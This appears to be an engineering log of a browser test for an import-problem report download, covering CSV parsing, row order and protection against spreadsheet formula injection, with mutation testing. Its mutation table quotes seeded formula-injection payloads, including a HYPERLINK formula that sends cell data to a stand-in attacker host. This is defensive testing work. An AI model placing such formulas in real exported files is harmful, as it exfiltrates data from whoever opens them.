# Cases 36 and 37, in a browser — 2026-09-22

What ran, so the result can be reproduced rather than believed.

- A product generated `--with data_import`, given the harness target and table
  from `../2026-09-22-01/`. A generated product declares no targets, so
  `ImportPanel` returns its no-targets banner and never renders — which is why
  this cannot run in this repository's own CI.
- `seed-620-problems.sql` against that product's database: one run in
  `validation_failed` with 620 row errors whose file row numbers start at
  10,000, four of them shaped like spreadsheet formulas.
- `imports-report.spec.ts` in the round-trip project: a real browser, this
  product's own API, a token verified against a discovered JWKS, row-level
  security on.

The spec opens the run from the history — which is IMP2-29's fix, and without
which there is no way to reach the report at all — downloads the file, and
parses it as CSV rather than by splitting on newlines, because a quoted field
may hold one.

## Result

```
  ok 1 [roundtrip] › imports-report.spec.ts › the downloaded report holds
       every problem, once, and executes nothing (1.9s)
  1 passed
```

620 rows, 620 distinct, first 10000, last 10619, in file order. The cell holding
a comma and doubled quotes survives as one cell. No value begins `=`, `+`, `-`,
`@`, tab or carriage return, and the four seeded payloads are present with a
leading apostrophe.

## Mutation-checked, twice

| Removed | What the run reported |
|---|---|
| `guardCell(cell)` | `these cells would be evaluated by a spreadsheet: =HYPERLINK("https://attacker.test/?d="&A2,"Click") \| +1+1 \| @SUM(1+1) \| -2+3` |
| `onClick={() => open(row)}` | *Download every problem* never becomes visible — IMP2-29 exactly |

Each was rebuilt and re-run, then restored and re-run green.
